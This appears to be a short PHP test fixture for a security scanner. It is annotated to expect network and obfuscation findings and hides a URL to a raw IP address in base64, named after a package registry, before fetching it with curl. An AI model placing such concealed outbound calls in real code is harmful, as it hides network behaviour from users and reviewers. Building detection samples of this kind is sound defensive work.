<?php
// @expect: NETWORK, OBFUSCATION
// @targets: host:44.210.94.38
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, base64_decode('aHR0cHM6Ly80NC4yMTAuOTQuMzgvcGFja2FnaXN0LnBocA=='));
curl_exec($ch);
